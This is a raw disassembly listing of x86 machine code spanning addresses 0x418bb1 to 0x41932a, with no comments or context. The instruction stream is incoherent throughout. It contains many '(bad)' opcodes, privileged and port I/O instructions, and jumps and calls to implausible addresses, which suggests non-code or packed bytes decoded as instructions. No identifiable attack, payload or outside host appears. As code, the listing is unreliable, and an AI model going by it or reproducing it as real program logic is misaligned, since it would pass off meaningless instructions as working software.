  418bb1:	gs dec ebp
  418bb3:	in     eax,dx
  418bb4:	lods   eax,DWORD PTR ds:[esi]
  418bb5:	adc    al,0xd4
  418bb7:	sti    
  418bb8:	mov    ebx,0x7fb30559
  418bbd:	mov    esi,0x69b492a8
  418bc2:	push   0xe9a6a47d
  418bc7:	mov    ds:0x6e521309,eax
  418bcc:	or     ebx,DWORD PTR [esi]
  418bce:	dec    ebx
  418bcf:	jno    0x418bbd
  418bd1:	test   eax,0xb900460e
  418bd6:	sbb    al,0x4b
  418bd8:	int    0x25
  418bda:	rol    BYTE PTR [edi-0x7fa16c10],cl
  418be0:	push   esp
  418be1:	jle    0x418c4b
  418be3:	cld    
  418be4:	or     DWORD PTR [edx],ecx
  418be6:	xchg   esi,eax
  418be7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418be8:	mov    dl,0xb3
  418bea:	mov    al,ds:0xf5d83607
  418bef:	adc    cl,dl
  418bf1:	(bad)  
  418bf2:	pusha  
  418bf3:	mov    ebp,0x349175a2
  418bf8:	add    BYTE PTR [esi+eax*4-0x73],dh
  418bfc:	or     DWORD PTR [edi+0x5],esp
  418bff:	mov    al,ds:0xead1699b
  418c04:	in     al,0xdc
  418c06:	add    DWORD PTR [ebx-0x616deeed],eax
  418c0c:	test   al,0xa
  418c0e:	xchg   edx,eax
  418c0f:	scas   al,BYTE PTR es:[edi]
  418c10:	cli    
  418c11:	pushf  
  418c12:	cdq    
  418c13:	ja     0x418bf0
  418c15:	dec    ecx
  418c16:	push   edi
  418c17:	scas   al,BYTE PTR es:[edi]
  418c18:	adc    BYTE PTR [edi+0x52],bh
  418c1b:	mov    ecx,0x59fd59df
  418c20:	mov    edi,0xb040b8e0
  418c25:	pop    esp
  418c26:	inc    edi
  418c27:	into   
  418c28:	mov    ch,0xdd
  418c2a:	mov    ebp,0xf9f68a77
  418c2f:	fidivr WORD PTR [edx]
  418c31:	not    DWORD PTR [edi]
  418c33:	cmp    dl,BYTE PTR [ebx-0x40]
  418c36:	dec    ebp
  418c37:	jmp    0x418cb8
  418c39:	icebp  
  418c3a:	jecxz  0x418c88
  418c3c:	retf   
  418c3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c3e:	dec    ecx
  418c3f:	cdq    
  418c40:	inc    ecx
  418c41:	push   ebx
  418c42:	xchg   ebx,eax
  418c43:	push   eax
  418c44:	mov    edi,0x45a16e
  418c49:	inc    edi
  418c4a:	pushf  
  418c4b:	leave  
  418c4c:	cs cwde 
  418c4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c4f:	xor    ch,BYTE PTR es:[eax+0x4c]
  418c53:	add    al,0x8a
  418c55:	loop   0x418c24
  418c57:	(bad)  
  418c58:	lods   eax,DWORD PTR ds:[esi]
  418c59:	xor    dl,BYTE PTR [ebx+0x72]
  418c5c:	inc    eax
  418c5d:	aad    0x26
  418c5f:	int3   
  418c60:	push   edx
  418c61:	jns    0x418be7
  418c63:	(bad)  
  418c64:	fdivr  DWORD PTR [edi-0x673c848b]
  418c6a:	push   es
  418c6b:	fucompp 
  418c6d:	dec    esp
  418c6e:	and    DWORD PTR [edx],esp
  418c70:	(bad)  
  418c71:	cmp    cl,BYTE PTR [edx-0x5e]
  418c74:	jmp    0x418cc0
  418c76:	lahf   
  418c77:	pop    ss
  418c78:	add    dl,dl
  418c7a:	sbb    ch,BYTE PTR [ecx-0xa7b2bf7]
  418c80:	cdq    
  418c81:	mov    cs,WORD PTR [edi]
  418c83:	xor    ebx,0xffffffb8
  418c86:	cli    
  418c87:	jo     0x418c8c
  418c89:	rcr    DWORD PTR [edi+0x71c791c8],1
  418c8f:	popf   
  418c90:	fadd   DWORD PTR gs:[ebx+eiz*2]
  418c94:	ret    0x3f37
  418c97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c98:	(bad)  
  418c99:	iret   
  418c9a:	xor    eax,0x3d38abb7
  418c9f:	outs   dx,BYTE PTR ds:[esi]
  418ca0:	in     eax,dx
  418ca1:	ja     0x418c9d
  418ca3:	aas    
  418ca4:	test   al,0x8a
  418ca6:	mov    fs,WORD PTR [eax-0x4f]
  418ca9:	lods   al,BYTE PTR ds:[esi]
  418caa:	inc    esp
  418cab:	rcl    BYTE PTR [ecx],0x61
  418cae:	sub    esp,0x66
  418cb1:	shr    DWORD PTR [eax],1
  418cb3:	add    DWORD PTR [edx-0x1],0x882f0431
  418cba:	inc    esp
  418cbb:	push   ecx
  418cbc:	mul    DWORD PTR [esi]
  418cbe:	lahf   
  418cbf:	popw   ss
  418cc1:	xchg   edx,eax
  418cc2:	xor    al,0x62
  418cc4:	ja     0x418c6c
  418cc6:	jmp    0x2c43f506
  418ccb:	gs (bad) 
  418ccd:	xor    al,0x16
  418ccf:	add    al,dh
  418cd1:	or     BYTE PTR [edx],cl
  418cd3:	icebp  
  418cd4:	pop    es
  418cd5:	xchg   ecx,eax
  418cd6:	pop    eax
  418cd7:	rol    cl,0x96
  418cda:	fwait
  418cdb:	jmp    0x418d2c
  418cdd:	adc    eax,0x763af453
  418ce2:	add    al,0xea
  418ce4:	in     eax,dx
  418ce5:	sbb    DWORD PTR [edx-0x7b],esp
  418ce8:	out    0xb8,eax
  418cea:	rcr    DWORD PTR [esi+0x517afd92],1
  418cf0:	imul   eax,DWORD PTR [ebx+0x3c],0x66bd716a
  418cf7:	(bad)  
  418cf8:	aam    0x71
  418cfa:	ins    DWORD PTR es:[edi],dx
  418cfb:	and    esp,DWORD PTR [edi]
  418cfd:	jno    0x418d20
  418cff:	push   ds
  418d00:	call   0x33fbf0a8
  418d05:	ds jae 0x418d3d
  418d08:	(bad)  
  418d09:	enter  0x2b97,0x7
  418d0d:	out    0x40,al
  418d0f:	imul   BYTE PTR [esi]
  418d11:	pop    ecx
  418d12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d13:	sub    ah,BYTE PTR [ecx-0x4f61ae69]
  418d19:	dec    edi
  418d1a:	pop    edx
  418d1b:	mul    DWORD PTR [ecx]
  418d1d:	inc    ebp
  418d1e:	mov    edx,0x22fa9fb9
  418d23:	enter  0x48aa,0xe
  418d27:	int    0xdd
  418d29:	aad    0x27
  418d2b:	sub    BYTE PTR [esi-0x6cde7539],dh
  418d31:	xchg   BYTE PTR [ecx+0x260d78b3],bl
  418d37:	lods   al,BYTE PTR ds:[esi]
  418d38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d39:	push   es
  418d3a:	push   edi
  418d3b:	out    0x45,eax
  418d3d:	inc    ebx
  418d3e:	fld    QWORD PTR [ebp-0x30]
  418d41:	daa    
  418d42:	dec    esp
  418d43:	iret   
  418d44:	push   cs
  418d45:	or     esi,eax
  418d47:	xchg   DWORD PTR [eax-0x78f06261],ebp
  418d4d:	xchg   DWORD PTR [ebx],ebp
  418d4f:	mov    esp,0xeaeeae0
  418d54:	in     al,dx
  418d55:	push   edx
  418d56:	inc    esi
  418d57:	inc    ebx
  418d58:	add    BYTE PTR [eax+0x2],dh
  418d5b:	pop    ebx
  418d5c:	dec    ebx
  418d5d:	sub    BYTE PTR [edi+0x3aca308c],al
  418d63:	ss inc ebp
  418d65:	jns    0x2ff146c1
  418d6b:	xchg   esi,eax
  418d6c:	hlt    
  418d6d:	fstp   DWORD PTR [esp+eiz*4-0xea0a881]
  418d74:	mov    ebp,0x16e5e61f
  418d79:	pop    edi
  418d7a:	lahf   
  418d7b:	or     al,0x12
  418d7d:	xor    al,0xf5
  418d7f:	push   cs
  418d80:	jns    0x418dc6
  418d82:	mov    eax,ds:0xb7102b60
  418d87:	sbb    BYTE PTR [ebx-0x13873ad2],bh
  418d8d:	xor    al,0x3a
  418d8f:	jg     0x418dbe
  418d91:	xchg   edx,eax
  418d92:	jg     0x418de4
  418d94:	push   ss
  418d95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d96:	add    BYTE PTR [eax-0x1a64e252],dh
  418d9c:	mov    ebp,0x9e6b9ce5
  418da1:	or     DWORD PTR [edi],0xa6e48aae
  418da7:	pop    eax
  418da8:	aad    0x48
  418daa:	add    edx,DWORD PTR [edx+0x1a]
  418dad:	(bad)  
  418dae:	and    BYTE PTR [edi],dh
  418db0:	inc    edx
  418db1:	rcl    DWORD PTR [esi],1
  418db3:	and    eax,0xf1c100ad
  418db8:	xor    bh,BYTE PTR [edi+ebp*4]
  418dbb:	in     eax,0x64
  418dbd:	and    esi,DWORD PTR [ecx+0xc2dc63b]
  418dc3:	adc    eax,DWORD PTR [eax]
  418dc5:	shl    DWORD PTR [edx-0x64],1
  418dc8:	inc    eax
  418dc9:	push   ebx
  418dca:	lock aam 0x77
  418dcd:	adc    dl,BYTE PTR ss:[esi]
  418dd0:	push   0x9e739f41
  418dd5:	jnp    0x418e3a
  418dd7:	xchg   ebx,eax
  418dd8:	sbb    DWORD PTR [ebx+0x60],eax
  418ddb:	pop    edi
  418ddc:	inc    edx
  418ddd:	into   
  418dde:	and    bl,ch
  418de0:	and    eax,0xac8b5572
  418de5:	test   DWORD PTR [eax-0x3750f44b],eax
  418deb:	loop   0x418e19
  418ded:	push   eax
  418dee:	bound  eax,QWORD PTR [esi-0x55]
  418df1:	(bad)  
  418df2:	xor    al,0x50
  418df4:	push   es
  418df5:	dec    esi
  418df6:	cli    
  418df7:	pop    esp
  418df8:	iret   
  418df9:	mov    ebx,ebx
  418dfb:	ja     0x418e04
  418dfd:	pop    ss
  418dfe:	jo     0x418e59
  418e00:	ins    BYTE PTR es:[edi],dx
  418e01:	add    BYTE PTR [ebp-0x2c347273],0xe2
  418e08:	and    esp,ecx
  418e0a:	out    dx,al
  418e0b:	(bad)  
  418e0c:	(bad)  
  418e0d:	lock call 0x6cc6b226
  418e13:	frstor [ecx-0x49]
  418e16:	inc    esp
  418e17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e18:	sub    al,0x4d
  418e1a:	out    0x0,al
  418e1c:	jb     0x418de0
  418e1e:	dec    edx
  418e1f:	push   es
  418e20:	jecxz  0x418e05
  418e22:	mov    cl,0x2a
  418e24:	cld    
  418e25:	aaa    
  418e26:	push   0x63292172
  418e2b:	pop    eax
  418e2c:	mov    al,0xff
  418e2e:	(bad)  
  418e2f:	mov    esi,0xa3e42436
  418e34:	test   ah,bl
  418e36:	scas   eax,DWORD PTR es:[edi]
  418e37:	mov    bl,0x80
  418e39:	dec    ebp
  418e3a:	sbb    BYTE PTR [ebx+0x5878cab],al
  418e40:	std    
  418e41:	push   0xc45b422
  418e46:	jle    0x418e7c
  418e48:	out    dx,eax
  418e49:	adc    DWORD PTR [edi],0xffffff90
  418e4c:	loopne 0x418e29
  418e4e:	ds gs inc edi
  418e51:	jecxz  0x418e82
  418e53:	enter  0x753f,0xf4
  418e57:	jl     0x418deb
  418e59:	retf   0xe23c
  418e5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e5d:	sbb    ch,bl
  418e5f:	jg     0x418e94
  418e61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e62:	in     al,dx
  418e63:	push   ecx
  418e64:	adc    al,0x5f
  418e66:	imul   esi,DWORD PTR [esp+edi*4+0x61],0x4606e7b7
  418e6e:	aas    
  418e6f:	aad    0xd8
  418e71:	or     BYTE PTR [ebp+0x22],ah
  418e74:	mov    BYTE PTR [edx+0x6],dl
  418e77:	jno    0x418ea6
  418e79:	mov    bh,0xc4
  418e7b:	aaa    
  418e7c:	int    0x49
  418e7e:	jecxz  0x418e7d
  418e80:	push   esp
  418e81:	iret   
  418e82:	mov    cl,0xc
  418e84:	jmp    ebp
  418e86:	pop    esp
  418e87:	rol    ecx,0x8c
  418e8a:	and    eax,0x868c79c5
  418e8f:	(bad)  
  418e90:	mov    eax,0x4f75d6db
  418e95:	or     edx,ebx
  418e97:	mov    ds:0x904376e9,eax
  418e9c:	mov    ebx,0x7bbc0105
  418ea1:	cmp    eax,ebx
  418ea3:	jmp    0xafc1:0x4e7201c5
  418eaa:	jo     0x418ee8
  418eac:	sbb    eax,0xe7478ed4
  418eb1:	xchg   edx,eax
  418eb2:	loopne 0x418ee5
  418eb4:	stos   BYTE PTR es:[edi],al
  418eb5:	sub    al,0x55
  418eb7:	cmp    cl,BYTE PTR [ecx]
  418eb9:	dec    ebx
  418eba:	mov    edi,0x4eb7a1b5
  418ebf:	into   
  418ec0:	pop    edi
  418ec1:	test   BYTE PTR [eax],0xd2
  418ec4:	(bad)  
  418ec5:	jnp    0x418f3e
  418ec7:	call   0x999b028a
  418ecc:	mov    dh,0xa7
  418ece:	or     edx,DWORD PTR [esp+eax*4-0x3f]
  418ed2:	jnp    0x418f3c
  418ed4:	sub    DWORD PTR [ecx-0x59605771],0xffffffc3
  418edb:	dec    edx
  418edc:	inc    ebx
  418edd:	retf   0x13a4
  418ee0:	or     edi,DWORD PTR [eax-0x46]
  418ee3:	loopne 0x418e74
  418ee5:	out    dx,al
  418ee6:	and    DWORD PTR [ebp-0x72],esp
  418ee9:	xchg   esi,eax
  418eea:	pop    ebx
  418eeb:	add    esp,ebx
  418eed:	test   bl,bl
  418eef:	sbb    bh,cl
  418ef1:	popa   
  418ef2:	jne    0x418e7c
  418ef4:	jbe    0x418ec5
  418ef6:	stos   BYTE PTR es:[edi],al
  418ef7:	pushf  
  418ef8:	js     0x418f0e
  418efa:	sbb    dh,BYTE PTR [eax+ebp*2+0xd]
  418efe:	xchg   BYTE PTR [ebx],al
  418f00:	jno    0x418f27
  418f02:	(bad)  
  418f04:	inc    eax
  418f05:	hlt    
  418f06:	test   DWORD PTR [ebp-0x4fbbc5bc],ecx
  418f0c:	push   esp
  418f0d:	loope  0x418f23
  418f0f:	sub    DWORD PTR [edx-0x68fce53c],0x4
  418f16:	jb     0x418eee
  418f18:	adc    DWORD PTR [edx-0x41],edi
  418f1b:	mov    ebp,esi
  418f1d:	lds    edi,FWORD PTR [eax]
  418f1f:	out    dx,al
  418f20:	and    al,0x99
  418f22:	pushf  
  418f23:	inc    esp
  418f24:	pop    ss
  418f25:	cmp    eax,0xfb0229c6
  418f2a:	push   0xcfa0a097
  418f2f:	call   0xd134:0x9aadc640
  418f36:	lods   al,BYTE PTR ds:[esi]
  418f37:	stos   DWORD PTR es:[edi],eax
  418f38:	pop    ecx
  418f39:	lods   eax,DWORD PTR ds:[esi]
  418f3a:	adc    dh,BYTE PTR [ebx]
  418f3c:	xlat   BYTE PTR ds:[ebx]
  418f3d:	jne    0x418f7b
  418f3f:	stc    
  418f40:	pop    edi
  418f41:	dec    ecx
  418f42:	mov    esi,0xe1b10bfd
  418f47:	jp     0x418f4f
  418f49:	test   BYTE PTR [edx+ecx*2-0xf],ch
  418f4d:	inc    ebx
  418f4e:	mov    ds:0x5208ef2f,al
  418f53:	ja     0x418ee9
  418f55:	sub    al,0xce
  418f57:	shl    cl,cl
  418f59:	and    al,0x48
  418f5b:	push   edx
  418f5c:	xor    DWORD PTR [edx+ebx*8],ecx
  418f5f:	aam    0xf3
  418f61:	xchg   ecx,eax
  418f62:	out    0xf5,eax
  418f64:	mov    cs,ebx
  418f66:	mov    al,ds:0x47a67320
  418f6b:	icebp  
  418f6c:	sbb    al,0xe7
  418f6e:	cmp    bh,ah
  418f70:	jnp    0x418f49
  418f72:	xor    dh,bh
  418f74:	popf   
  418f75:	lsl    edi,WORD PTR [ebx-0x386992dc]
  418f7c:	fcom   DWORD PTR [ebx+0x21a4ed26]
  418f82:	and    al,0x7b
  418f84:	into   
  418f85:	loope  0x418faf
  418f87:	sar    DWORD PTR [edx+0x4b],0x9c
  418f8b:	dec    esi
  418f8c:	cld    
  418f8d:	adc    bh,cl
  418f8f:	push   ebp
  418f90:	push   ds
  418f91:	cmp    ah,BYTE PTR [ebx+0x1ccbc065]
  418f97:	xor    eax,0xcfe389f9
  418f9c:	sbb    BYTE PTR [ecx],al
  418f9e:	scas   eax,DWORD PTR es:[edi]
  418f9f:	std    
  418fa0:	fadd   QWORD PTR ds:0x903c5e52
  418fa6:	inc    esi
  418fa7:	or     al,0x91
  418fa9:	dec    edi
  418faa:	mov    ch,0x45
  418fac:	cmp    eax,0x4008c6e9
  418fb1:	inc    edi
  418fb2:	cli    
  418fb3:	sub    ebp,DWORD PTR [ebx-0x4bdaf8e5]
  418fb9:	push   ds
  418fba:	out    dx,eax
  418fbb:	cmc    
  418fbc:	inc    ecx
  418fbd:	jae    0x418fd2
  418fbf:	cmp    al,0xed
  418fc1:	iret   
  418fc2:	test   DWORD PTR ss:[ebp+0x25],0xab6ea256
  418fca:	pop    ebx
  418fcb:	pop    edx
  418fcc:	xchg   edi,eax
  418fcd:	aam    0xe9
  418fcf:	pop    ebp
  418fd0:	fs inc eax
  418fd2:	sub    ebx,ecx
  418fd4:	out    0xe7,eax
  418fd6:	sub    BYTE PTR [esi],0x42
  418fd9:	mov    ecx,0x35a81f62
  418fde:	repnz in al,dx
  418fe0:	cmc    
  418fe1:	daa    
  418fe2:	loope  0x418f9c
  418fe4:	sahf   
  418fe5:	mov    ebx,0xdb22b0b9
  418fea:	xor    BYTE PTR [ebp+0x65c42934],dl
  418ff0:	xchg   esi,eax
  418ff1:	out    dx,eax
  418ff2:	int    0x93
  418ff4:	jmp    0x33f8ee6f
  418ff9:	repnz fcom DWORD PTR [ebp+ecx*1+0x4205c078]
  419001:	jge    0x418f8b
  419003:	xchg   edx,edi
  419005:	not    BYTE PTR ds:0xb4c16551
  41900b:	push   0x19
  41900d:	sub    al,BYTE PTR [eax+eiz*2]
  419010:	cmp    ch,BYTE PTR [edx-0xcb315e2]
  419016:	(bad)  
  419017:	mov    ch,0x19
  419019:	inc    ecx
  41901a:	aam    0xff
  41901c:	gs test eax,0xeb111cd0
  419022:	(bad)  
  419024:	sub    dl,ah
  419026:	jae    0x41906c
  419028:	fld    QWORD PTR [ebp+0x3f2d9905]
  41902e:	push   es
  41902f:	retf   0x85a4
  419032:	addr16 add al,0xb1
  419035:	loop   0x419067
  419037:	push   ecx
  419038:	(bad)  
  419039:	xlat   BYTE PTR ds:[ebx]
  41903a:	cmp    esi,DWORD PTR [eax]
  41903c:	pop    ecx
  41903d:	dec    esp
  41903e:	(bad)  
  41903f:	(bad)  
  419040:	cwde   
  419041:	mov    BYTE PTR [edi+ecx*2+0x30],dh
  419045:	adc    al,0xac
  419047:	mov    eax,ds:0x5919bc26
  41904c:	lock jp 0x418ffa
  41904f:	shl    BYTE PTR [esi+0x291d9dbc],0x59
  419056:	adc    BYTE PTR [esi],bh
  419058:	aad    0xa5
  41905a:	push   0x49d6bae5
  41905f:	jl     0x419038
  419061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419062:	or     dl,BYTE PTR [eax+edx*4+0x0]
  419066:	ins    BYTE PTR es:[edi],dx
  419067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419068:	mov    ds:0xca951126,eax
  41906d:	mov    bh,0x11
  41906f:	dec    eax
  419070:	stos   DWORD PTR es:[edi],eax
  419071:	or     cl,BYTE PTR [esi-0xce5a965]
  419077:	es in  eax,0x18
  41907a:	xlat   BYTE PTR ds:[ebx]
  41907b:	pop    esp
  41907c:	cmp    eax,0x25fbc68a
  419081:	and    BYTE PTR [ecx],0xc5
  419084:	xlat   BYTE PTR ds:[ebx]
  419085:	pusha  
  419086:	data16 lods al,BYTE PTR ds:[esi]
  419088:	cmp    edx,DWORD PTR [eax-0x5691774]
  41908e:	push   ebx
  41908f:	and    ebp,DWORD PTR [edi+edx*1+0x4d]
  419093:	and    BYTE PTR [ebp+0x35],ah
  419096:	retf   0xc633
  419099:	mov    cl,0x75
  41909b:	inc    edx
  41909c:	aas    
  41909d:	es or  al,0x3e
  4190a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190a1:	mov    eax,0xf11afa11
  4190a6:	sub    bl,BYTE PTR [esi+0x0]
  4190a9:	dec    ebp
  4190aa:	iret   
  4190ab:	aaa    
  4190ac:	jnp    0x4190c0
  4190ae:	mov    edi,0x43870885
  4190b3:	or     bh,bl
  4190b5:	push   edx
  4190b6:	sar    BYTE PTR [edi-0x11],0x7c
  4190ba:	ror    DWORD PTR [ebx-0x68],cl
  4190bd:	or     edx,edx
  4190bf:	xor    DWORD PTR [esi-0x7b0de26f],0xb
  4190c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190c7:	xchg   ebp,eax
  4190c8:	scas   al,BYTE PTR es:[edi]
  4190c9:	les    esp,FWORD PTR [esi+0x40]
  4190cc:	xor    DWORD PTR [edx+0x3ab5480d],0x2f
  4190d3:	inc    edi
  4190d4:	imul   edx,DWORD PTR [ebp-0x777d096],0x8b062cb8
  4190de:	in     eax,0x54
  4190e0:	bound  esi,QWORD PTR [eax-0x71]
  4190e3:	cmp    ah,BYTE PTR [ebx+0x46]
  4190e6:	push   edx
  4190e7:	cmp    esp,DWORD PTR [ebx]
  4190e9:	call   0xf472d95d
  4190ee:	sbb    ebx,DWORD PTR [esp+ebp*4+0x5052bacf]
  4190f5:	outs   dx,BYTE PTR ds:[esi]
  4190f6:	cld    
  4190f7:	stos   BYTE PTR es:[edi],al
  4190f8:	mov    dl,0x7b
  4190fa:	xchg   BYTE PTR [eax],bl
  4190fc:	push   edx
  4190fd:	pop    edx
  4190fe:	inc    esi
  4190ff:	xchg   edx,eax
  419100:	ret    
  419101:	dec    esp
  419102:	jmp    0x4092:0x2e2423aa
  419109:	inc    edx
  41910a:	push   ebx
  41910b:	inc    esi
  41910c:	fs je  0x419101
  41910f:	push   edi
  419110:	neg    DWORD PTR [edx+0x4]
  419113:	mov    esi,0x1dca41be
  419118:	loop   0x419107
  41911a:	and    DWORD PTR [edx],eax
  41911c:	fdivrp st(6),st
  41911e:	retf   
  41911f:	aam    0x1a
  419121:	(bad)  
  419122:	adc    ch,BYTE PTR [eax+0x6d]
  419125:	xchg   ebx,eax
  419126:	sbb    BYTE PTR [esp+edx*4+0x7a],al
  41912a:	sub    BYTE PTR [eax],bh
  41912c:	add    bh,BYTE PTR ss:[edi]
  41912f:	pop    ds
  419130:	jns    0x419163
  419132:	mov    esp,0x6892934c
  419137:	call   0xdcce0886
  41913c:	cmc    
  41913d:	popf   
  41913e:	cmp    DWORD PTR [esi-0x2b],edx
  419141:	add    bl,bl
  419143:	jns    0x4191a2
  419145:	and    al,0x56
  419148:	test   DWORD PTR [edi],0xed2a4b74
  41914e:	pop    esi
  41914f:	sahf   
  419150:	pop    es
  419151:	mov    edx,0x7723a7bd
  419156:	sub    esp,edi
  419158:	mov    bh,0x63
  41915a:	hlt    
  41915b:	or     BYTE PTR [esp+eiz*2-0x79],dl
  41915f:	sbb    al,0xa0
  419161:	sub    BYTE PTR [edx-0x69],dh
  419164:	inc    ebx
  419165:	mov    cl,0x43
  419167:	mov    bl,0xcc
  419169:	mov    dl,0x32
  41916b:	sub    esp,DWORD PTR [eax+0x73fca4d1]
  419171:	jecxz  0x4191a5
  419173:	call   0x6f9efdc1
  419178:	xchg   edi,eax
  419179:	jno    0x4191f8
  41917b:	jle    0x4191d5
  41917d:	jno    0x4191c5
  41917f:	aaa    
  419180:	shl    edi,cl
  419182:	jp     0x41917a
  419184:	dec    edi
  419185:	jmp    0x4191a1
  419187:	adc    DWORD PTR [ebx+esi*8-0x6a],ecx
  41918b:	inc    edi
  41918c:	ins    BYTE PTR es:[edi],dx
  41918d:	shl    al,0xa5
  419190:	xchg   ecx,eax
  419191:	outs   dx,DWORD PTR ds:[esi]
  419192:	and    eax,0x48983c56
  419197:	inc    ecx
  419198:	mov    al,0x70
  41919a:	jmp    0x59085d69
  41919f:	in     al,0xa
  4191a1:	hlt    
  4191a2:	inc    esi
  4191a3:	repz push esp
  4191a5:	pop    esp
  4191a6:	inc    esi
  4191a7:	(bad)  
  4191a8:	(bad)  
  4191aa:	pop    es
  4191ab:	in     al,0x5
  4191ad:	jge    0x4191df
  4191af:	sbb    dl,0x5e
  4191b2:	push   0x5ec89c11
  4191b7:	dec    edx
  4191b8:	xchg   esi,eax
  4191b9:	jbe    0x41917e
  4191bb:	push   ecx
  4191bc:	sub    DWORD PTR [edx-0x36b72759],esi
  4191c2:	sbb    al,0x68
  4191c4:	inc    esp
  4191c5:	retf   0x4ee9
  4191c8:	mov    dl,0x96
  4191ca:	cmp    al,0x9d
  4191cc:	or     dl,BYTE PTR [esi-0xa]
  4191cf:	in     al,dx
  4191d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191d1:	outs   dx,BYTE PTR ds:[esi]
  4191d2:	add    ebx,DWORD PTR [esi+0x2cd3091e]
  4191d8:	push   esi
  4191d9:	add    dh,0x7
  4191dc:	int3   
  4191dd:	(bad)  
  4191de:	adc    BYTE PTR ds:0x236636e0,bh
  4191e4:	pop    edx
  4191e5:	mov    esi,0x9e1af97e
  4191ea:	adc    DWORD PTR [ecx+edx*1-0x70948cca],0x7eab7128
  4191f5:	(bad)  
  4191f6:	push   eax
  4191f7:	stc    
  4191f8:	or     BYTE PTR [ecx],0x95
  4191fb:	fld    TBYTE PTR [edi]
  4191fd:	cmc    
  4191fe:	mov    bl,0xd7
  419200:	push   esi
  419201:	jmp    0xb8684c35
  419206:	outs   dx,DWORD PTR ds:[esi]
  419207:	fadd   QWORD PTR [edi-0x6a2c4e29]
  41920d:	jb     0x4191f0
  41920f:	adc    ebx,DWORD PTR [ebx]
  419211:	pop    esi
  419212:	lods   eax,DWORD PTR ds:[esi]
  419213:	ret    0xdf6d
  419216:	mov    es:0xb9b77c60,al
  41921c:	(bad)  
  41921d:	out    dx,eax
  41921e:	out    0xc1,eax
  419220:	loop   0x41924c
  419222:	out    0x1b,eax
  419224:	fisub  WORD PTR [edi+0x6f]
  419227:	out    dx,al
  419228:	xor    edx,DWORD PTR ds:0x9570d4d2
  41922e:	ficomp WORD PTR [edx-0x27]
  419231:	jo     0x4191e7
  419233:	aad    0xfd
  419235:	(bad)  
  419236:	jo     0x419238
  419238:	call   0xd09dfea7
  41923d:	dec    ebx
  41923e:	mov    al,ds:0x9654abf4
  419243:	es test dh,dh
  419246:	xchg   esp,eax
  419247:	les    esp,FWORD PTR [ebx]
  419249:	into   
  41924a:	jae    0x41920d
  41924c:	rcl    BYTE PTR [edi+0x78],cl
  41924f:	and    eax,0xab28d7ae
  419254:	dec    ebx
  419255:	test   al,0xce
  419257:	sub    BYTE PTR [ebx+0x1ccbad1e],al
  41925d:	xchg   ebp,eax
  41925e:	jecxz  0x419201
  419260:	test   al,0x62
  419262:	xchg   edi,eax
  419263:	push   ds
  419264:	inc    edi
  419265:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419266:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419267:	cmp    eax,0xc1fb0bc6
  41926c:	jnp    0x4191f8
  41926e:	inc    edi
  41926f:	sub    BYTE PTR ds:0x9c604fb4,0x52
  419276:	ss ret 
  419278:	cmp    al,0xc2
  41927a:	test   DWORD PTR [edx-0x73],0x8fe4a91f
  419281:	in     eax,dx
  419282:	inc    edx
  419283:	mov    dl,0xa8
  419285:	sub    DWORD PTR ds:0xa194cbfa,esp
  41928b:	add    al,0xff
  41928d:	mov    bl,0xd4
  41928f:	js     0x41928c
  419291:	or     ebp,0x2
  419294:	mov    eax,0x76b48d70
  419299:	inc    esp
  41929a:	imul   cl
  41929c:	mov    esi,0xd91db6f2
  4192a1:	(bad)  
  4192a2:	(bad)  
  4192a3:	mov    ebp,0x82079f4b
  4192a8:	pop    edx
  4192a9:	je     0x41923e
  4192ab:	ficomp WORD PTR [ebp+eiz*1-0x549c0713]
  4192b2:	sbb    DWORD PTR [ebp+0x13],0x91d63afd
  4192b9:	push   0xffffffb0
  4192bb:	test   al,0x2e
  4192bd:	mov    ds:0x44892465,eax
  4192c2:	rol    bh,0x2a
  4192c5:	rcr    BYTE PTR [ecx],0x92
  4192c8:	repz mov dh,0x2b
  4192cb:	xchg   esi,eax
  4192cc:	pop    esp
  4192cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192ce:	or     DWORD PTR [ebp-0x8],edx
  4192d1:	jae    0x419261
  4192d3:	ret    0x8597
  4192d6:	hlt    
  4192d7:	imul   edi,ecx,0xffffffb3
  4192da:	xchg   BYTE PTR [ebp+0x1a38f5d0],bl
  4192e0:	out    dx,eax
  4192e1:	xchg   ebx,eax
  4192e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192e3:	jecxz  0x41931b
  4192e5:	aam    0x98
  4192e7:	mov    ds:0x45a701b4,eax
  4192ec:	(bad)
  4192f0:	stos   BYTE PTR es:[edi],al
  4192f1:	sbb    eax,0x1530fe10
  4192f6:	(bad)  
  4192f8:	dec    edx
  4192f9:	xor    al,0xf4
  4192fb:	ss ins DWORD PTR es:[edi],dx
  4192fd:	dec    esp
  4192fe:	mov    dh,bl
  419300:	scas   eax,DWORD PTR es:[edi]
  419301:	inc    ebp
  419302:	pop    ebx
  419303:	stos   DWORD PTR es:[edi],eax
  419304:	repnz loope 0x4192d7
  419307:	bound  ecx,QWORD PTR [edx]
  419309:	fldcw  WORD PTR [ecx-0x49]
  41930c:	int    0xbf
  41930e:	inc    esi
  41930f:	inc    esp
  419310:	and    al,0x1a
  419312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419313:	ins    DWORD PTR es:[edi],dx
  419314:	and    edi,DWORD PTR es:[esi-0x1f]
  419318:	xchg   ebp,eax
  419319:	les    esp,FWORD PTR [ecx+0x5bddff3c]
  41931f:	mov    esi,0x316de0d8
  419324:	and    edx,DWORD PTR [edi-0x1e92b0ac]
  41932a:	mov    ebp,0x69ee2c61
